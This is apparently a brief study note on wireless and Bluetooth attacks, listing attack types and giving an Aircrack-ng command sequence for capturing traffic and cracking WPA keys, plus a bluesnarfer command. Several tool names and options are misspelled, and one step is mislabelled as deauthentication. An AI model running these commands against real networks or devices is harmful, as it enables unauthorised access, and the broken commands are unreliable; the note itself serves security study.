<h5><em>ver: Sep-2022</em></h5>

<h2> Wireless Vulnerabilities</h2>

---

<h4>1. Rogue Access Points</h4>
<h4>2. Disassociation Attacks</h4>

-   Kismet
-   KisMAC
-   Airmon-ng (Aircrack-ng suite)

<h5>2-1. Attacks Against WEP/WPA</h5>

```sh
# kismat
kismat -h

# Aircrack-ng suite: requires Wi-Fi device connection
sudo airmon-ng check

# step-1: start wirelss interface monitor
sudo airmon-ng start wlan0 11

# step-2 capture all the traffic to a capture file
sudo airdump-ng -c 11 -bssid xx:xx:xx:xx:xx:xx -w file-name wlan0

# step-3 perform a deauthentication attack
aireplay-ng -3 -b xx:xx:xx:xx:xx:xx -h xx:xx:xx:xx:xx:xx wlan0

# step-4 crack WPA PSK
aircrack-ng -b xx:xx:xx:xx:xx:xx file-name.cap

```

<h4>3. Fragmentation Attacks</h4>

-   Refer to [aircrack-ng tech' manual](https://download.aircrack-ng.org/wiki-files/doc/technique_papers/Final-Nail-in-WEPs-Coffin.slides.pdf)

```sh
# wireless injection attack: usually not-effective
packetforce-ng --h

```

<h4>4. Bluejacking </h4>

-   Refer to https://acadpubl.eu/jsi/2017-116-8/articles/9/72.pdf

<h4>5. Bluesnarfing </h4>

```sh
bluesnarfer -b xx:xx:xx:xx:xx -i


```

<h4>6. Bluetooth Low energy Attack </h4>

-   Refer to https://dl.acm.org/doi/pdf/10.1145/3319535.3354240
